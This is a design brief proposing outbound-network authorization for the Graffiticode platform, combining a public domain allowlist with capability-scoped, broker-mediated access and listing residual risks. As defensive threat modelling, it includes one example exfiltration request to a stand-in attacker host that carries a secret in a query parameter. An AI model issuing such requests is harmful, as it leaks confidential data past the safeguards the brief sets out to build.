# Graffiticode Network Egress Authorization
## Design Brief: Public Allowlisting and Capability-Authorized Operations

**Status:** Proposed  
**Date:** November 25, 2026  
**Scope:** Graffiticode backend, Policy, Broker, egress proxy, and language configuration

---

## 1. Executive Summary

Graffiticode should authorize outbound network operations through two complementary mechanisms:

1. **Public allowlisting:** Unprivileged, read-oriented operations may access approved public internet destinations, including broad domain patterns such as `*.gov`.
2. **Capability authorization:** Operations accessing protected services may bypass the public-domain allowlist when their destination and requested operation are authorized by a registered capability and the appropriate user grants.

All other outbound network operations are denied.

The two mechanisms are alternatives rather than cumulative requirements. A registered, granted capability provides authorization independently of the public allowlist.

Crucially, capability authorization is not unrestricted network access. Each capability is constrained by its registered service, supported operations, credentials, and grants.

The resulting security principle is:

> Every outbound operation must be authorized either by the public destination allowlist or by an explicitly granted capability. Neither mechanism grants unrestricted network access.

This design builds on Graffiticode's existing Policy, Broker, and egress-proxy architecture without requiring general-purpose information-flow tracking.

## 2. Motivation

### 2.1 The original concern

A discussion of Graffiticode's deployed capability-security architecture raised a concern about languages with open internet access.

Even when a compiler cannot access internal networks or retrieve credentials, unrestricted outbound requests could allow it to transmit information to an attacker-controlled public endpoint.

For example:

```text
GET https://attacker.example/collect?data=SECRET
```

Although this is an HTTP GET request, it transmits information to the destination.

The existing capability model protects operations against registered services, but unrestricted public egress creates a separate potential channel for information disclosure.

The concern is legitimate because:

- Blocking private IP addresses does not prevent communication with malicious public endpoints.
- Withholding credentials does not prevent disclosure of sensitive input data.
- HTTP GET is not inherently free of side effects.
- A compromised compiler could exploit unrestricted network access even when its declared purpose is read-only retrieval.

The design must therefore constrain outbound destinations independently of whether an operation is described as read-only.

### 2.2 Intended purpose of open languages

Open languages are intended to retrieve information from public sources, such as government datasets, educational resources, and public APIs.

They are not intended to provide unrestricted access to private systems or perform arbitrary external writes.

This distinction changes the problem.

Graffiticode does not need to allow arbitrary internet destinations to support its intended public-data retrieval use cases. It needs to permit an appropriately broad collection of approved public sources.

### 2.3 Protected operations have different requirements

Some languages must retrieve or modify information in protected systems, such as a private Learnosity item bank.

These operations require registered credentials and explicit grants.

Requiring their destinations to appear on the general public allowlist would add redundant authorization requirements and conflate two different trust models.

Instead, the capability registration should establish the permitted destinations and operations.

## 3. Design Goals

The proposed model should:

1. Support broad retrieval of public information without requiring individual grants for every public source.
2. Prevent unprivileged compilers from contacting arbitrary destinations.
3. Permit authorized access to private or authenticated services without requiring those destinations on the public allowlist.
4. Preserve fine-grained authorization for protected reads and writes.
5. Enforce outbound network restrictions independently of individual compiler implementations.
6. Maintain a straightforward policy that can be understood, audited, and tested.
7. Minimize changes to the Graffiticode language and task model.

### Non-goals

The initial design does not attempt to:

- Provide general-purpose dynamic information-flow tracking.
- Prove that every accessible public endpoint contains only public information.
- Guarantee that information cannot be disclosed through an approved destination.
- Detect all sensitive information embedded in user-supplied source code.
- Make HTTP GET or other nominally read-only operations intrinsically side-effect-free.

These limitations must be documented rather than hidden behind the term "read-only."

## 4. Proposed Authorization Model

Every outbound operation must satisfy one of two authorization paths.

### 4.1 Public allowlist authorization

An operation is permitted through the public path when:

- Its destination matches an approved public host or domain pattern.
- The request uses an allowed protocol and method.
- It does not use protected credentials or privileged network access.
- The destination satisfies network safety checks.
- The applicable language and execution policy permit public retrieval.

Example policy:

```yaml
network:
  public_egress:
    enabled: true
    methods:
      - GET
      - HEAD
    hosts:
      - "*.gov"
      - "*.edu"
      - "*.wikipedia.org"
      - "*.worldbank.org"
```

Host allowlists may be defined by language and constrained further by deployment-wide policy.

This configuration is illustrative; the precise policy schema remains to be designed.

### 4.2 Capability authorization

An operation is permitted through the capability path when:

- A corresponding capability is registered.
- The requested destination matches the capability's registered endpoint policy.
- The requested operation is within the capability's permitted scope.
- The requesting principal has the necessary grants.
- Any required credentials are supplied through the Broker.
- The request satisfies the capability's security constraints.

Illustrative registration:

```yaml
capability:
  name: learnosity-items
  destination:
    hosts:
      - api.learnosity.com
  operations:
    - items:read
    - items:write
  credentials:
    mode: broker-managed
```

This does not imply that all users receive both grants or that a hostname alone authorizes an API operation.

The registration identifies possible operations. Runtime authorization determines which operations the principal may actually perform.

### 4.3 Unified policy

```text
ALLOW operation IF:

  PublicAllowlistAuthorizes(operation)

  OR

  RegisteredCapabilityAuthorizes(operation)
    AND PrincipalHasRequiredGrants(operation)

DENY otherwise
```

The public and capability paths are independent sources of authority.

Neither path bypasses the common network safety controls.

## 5. Why These Two Paths Are Necessary

### 5.1 Why not allow unrestricted public egress?

Unrestricted public egress permits requests to attacker-controlled servers.

Even a read-oriented compiler could disclose information through URL paths, query parameters, or request headers.

A public allowlist substantially restricts this channel while preserving access to useful data sources.

### 5.2 Why not require grants for every public source?

Requiring individual capabilities for ordinary public information retrieval would introduce substantial configuration overhead.

A language retrieving public census or weather data should not require a registered credential or grant when no privileged access is involved.

Public allowlisting establishes a simpler authorization path for these operations.

### 5.3 Why not use a narrow allowlist of individual hosts?

A small set of exact hosts would provide stronger destination restrictions but would limit the usefulness of public retrieval languages.

Broad domain patterns provide a practical compromise.

For example:

```text
*.gov
*.edu
*.wikipedia.org
```

They allow many useful public sources without permitting arbitrary public destinations.

A wildcard is a broad authorization decision, however, and should not be confused with a guarantee that every matching host is trustworthy.

### 5.4 Why exempt capability-authorized operations?

A registered capability already provides more specific authorization than the public allowlist.

Its registration identifies the service and permitted operations, while grants determine what the requesting principal may do.

Requiring public allowlisting as well would add an unrelated requirement.

For example, a private enterprise API should not need to be recognized as a public data destination to be accessible through an authorized capability.

The capability effectively supplies its own scoped destination policy.

### 5.5 Why not implement information-flow tracking?

An earlier alternative was to classify outputs as public or protected and prohibit protected outputs from entering languages with broad public egress.

This could prevent some unsafe compositions of Graffiticode tasks.

However, it introduces substantial complexity:

- Classification metadata must survive composition and caching.
- The platform must track dependencies and propagation.
- Explicit declassification rules become necessary.
- Agents can potentially copy protected values into new task source code, bypassing simple provenance checks.

Most importantly, provenance labels cannot reliably prevent disclosure once an untrusted agent has received plaintext protected data.

Destination allowlisting addresses a narrower but important problem directly: limiting where compilers can communicate.

Therefore, full information-flow tracking is not required for the initial network authorization design.

It may remain useful as an independent defense for sensitive workflows.

## 6. Authorization Examples

| Operation | Public allowlist | Capability | Decision |
|---|---|---|---|
| GET public census data at `api.census.gov` | Matches `*.gov` | None | Allow |
| GET public NASA data | Matches `*.gov` | None | Allow |
| GET public data from an unapproved host | No match | None | Deny |
| Read private Learnosity items | Not required | Valid read grant | Allow |
| Write Learnosity items | Not required | Valid write grant | Allow |
| Write Learnosity items with read-only grant | Not required | Insufficient grant | Deny |
| Send request to an unrelated host using a Learnosity credential | No match | Does not authorize destination | Deny |
| GET an approved host that resolves to a prohibited private address | Host matches | None | Deny |

A capability must authorize the actual destination and operation. Possession of a key or the existence of a capability registration alone is insufficient.

## 7. Enforcement Architecture

### 7.1 Language configuration

Each language declares the network operations it needs.

For example, a public data-retrieval language may request access to selected public domain patterns.

Language configuration is subject to platform policy. A compiler cannot expand its own permissions at runtime.

### 7.2 Policy

Policy determines whether an outbound operation is authorized.

It evaluates the public destination policy or the registered capability and user grants.

Policy must not treat a request as capability-authorized merely because the compiler claims that it is.

### 7.3 Broker

The Broker handles capability-authorized operations, including credential use and operation-specific enforcement.

Credentials remain inaccessible to general public-fetch operations and must not be forwarded to destinations outside their registered scope.

### 7.4 Egress proxy

The egress proxy enforces outbound destination restrictions independently of the compiler.

It must enforce:

- Destination hostname matching.
- Public versus capability-authorized routing.
- Restrictions on direct outbound connections.
- Private-network and metadata-service protections.
- DNS and redirect validation.
- TLS destination verification.
- Applicable protocol and method restrictions.

Where method-level or path-level authorization is required, enforcement must occur at a layer able to inspect and validate those request properties. Network-level TLS routing alone is insufficient.

All compiler egress must be forced through the approved enforcement path.

### 7.5 Interpreter

The post-compilation interpreter may initiate network operations during immediate or durable execution.

Those operations must follow the same authorization model.

An interpreter must not inherit unrestricted network authority simply because it processes the output of an authorized compilation.

The same principle applies to retries, pagination, token refresh, and other durable operations.

### 7.6 Agent-facing protocols

MCP, A2A, and REST requests must converge on the same backend authorization mechanisms.

No agent-facing protocol should provide an alternative route around Policy, Broker, or egress enforcement.

## 8. Host Allowlist Semantics

Wildcard rules should use explicitly defined hostname matching.

For example:

```text
*.gov
```

would match:

```text
api.census.gov
data.nasa.gov
www.weather.gov
```

It would not match:

```text
example.com
gov.example.com
example.gov.attacker.com
```

A wildcard must be evaluated against properly parsed and normalized hostnames, not through substring matching.

Additional safeguards should address:

- Internationalized domain names and hostname normalization.
- DNS rebinding and changes in resolved addresses.
- HTTP redirects to unapproved destinations.
- Proxy bypass using alternate protocols or direct IP connections.
- Requests to internal, loopback, link-local, and metadata-service addresses.
- Domains that host user-controlled content or third-party applications.

Broad namespaces such as `*.gov` are useful, but approval of a namespace does not imply independent security review of every matching host.

## 9. Residual Risks

The design substantially limits arbitrary outbound communication, but it does not eliminate all disclosure risks.

### 9.1 Exfiltration to approved hosts

Some approved hosts may offer endpoints that accept arbitrary user-supplied content.

An attacker could exploit such an endpoint to transmit information even when the destination matches the allowlist.

More restrictive host, path, method, or request-shape policies may be appropriate for sensitive deployments.

### 9.2 Untrusted public responses

Public data can contain malicious or misleading content.

The allowlist restricts destinations; it does not make retrieved content trustworthy.

### 9.3 Information already visible to agents

An agent that possesses confidential information may attempt to disclose it through an approved destination.

Destination allowlisting reduces possible disclosure channels but does not establish a general confidentiality guarantee.

### 9.4 Compromised allowed services

An allowed destination could be compromised or operated in a way that permits unintended disclosure.

Host authorization is not equivalent to content or service trust.

### 9.5 Read-only semantics

GET and HEAD do not guarantee the absence of side effects on the destination service.

They restrict the form of the request, but they do not prove that the remote application is read-only.

The platform should describe these operations as read-oriented or retrieval operations rather than guarantee that they cannot have side effects.

## 10. Recommended Implementation Sequence

**Phase 1 — Public destination enforcement**

- Define public allowlist policy configuration.
- Support exact hosts and explicitly approved wildcard domains.
- Enforce network restrictions in the egress layer.
- Prevent direct network bypass.
- Add tests for hostname matching, DNS, redirects, and private-address blocking.

**Phase 2 — Capability-based exemptions**

- Associate registered capabilities with destination policies.
- Validate requested operations against registered scope and user grants.
- Route protected access through the Broker.
- Ensure capability-authorized operations do not require membership in the public allowlist.
- Reject credential use outside the registered capability.

**Phase 3 — Unified execution coverage**

- Apply the same rules to compiler and interpreter operations.
- Ensure consistent enforcement through MCP, A2A, and REST.
- Record the authorization path used for each outbound operation.
- Add regression tests for bypass attempts and unauthorized cross-service access.

**Phase 4 — Policy refinement**

- Review broad wildcard domains.
- Introduce narrower service-specific rules where necessary.
- Evaluate path, method, and request-shape restrictions.
- Consider information-flow controls for workflows handling especially sensitive data.

## 11. Open Design Questions

The following details require resolution before implementation:

1. **Allowlist ownership:** Should public host patterns be maintained globally, per language, or through an intersection of global and language-specific policy?
2. **Wildcard policy:** Which broad namespaces, such as `*.gov` and `*.edu`, should be approved by default?
3. **Capability routing:** How will outbound requests be reliably associated with registered capabilities so compilers cannot impersonate authorized operations?
4. **Granularity:** Which restrictions belong in the egress proxy versus Policy and Broker?
5. **Administrative control:** Can enterprise deployments impose stricter policies than the shared Graffiticode service?
6. **Audit:** What metadata should be recorded to explain why each outbound operation was permitted or denied?
7. **Existing D2 languages:** How should currently deployed open-egress languages transition to allowlisted access?

These are implementation questions rather than reasons to defer the core policy decision.

## 12. Conclusions

The discussion leads to five primary conclusions.

**First, unrestricted public egress is unnecessarily permissive for the intended purpose of open languages.** Their primary function is public information retrieval, which can be supported through approved destination namespaces.

**Second, public domain allowlisting offers a practical alternative to general information-flow tracking.** It addresses the immediate concern about arbitrary outbound destinations using enforcement mechanisms already compatible with the Graffiticode architecture.

**Third, broad wildcard domains are acceptable policy constructs when their limitations are understood.** They increase retrieval flexibility while providing less assurance than narrowly scoped hosts.

**Fourth, capability-authorized operations should not require public allowlist membership.** A registered capability and its grants provide an independent, more specific authorization mechanism.

**Fifth, all outbound operations remain subject to enforcement.** Neither open retrieval nor registered capabilities should permit unrestricted network access.

### Final Design Principle

> Graffiticode authorizes outbound operations through either approved public destinations or registered capabilities with appropriate grants. Public retrieval is unprivileged and destination-restricted. Protected operations are capability-scoped and Broker-mediated. Every outbound operation is subject to common network security controls, regardless of its authorization path.

This model preserves the flexibility of specialized languages while making their external authority explicit, limited, and auditable.

The most important architectural shift is that **network access is authorized per operation, rather than treating an entire compiler as either trusted or untrusted**. Language configuration declares what may be requested; Policy and Broker determine what is actually authorized; the egress layer enforces the boundary.
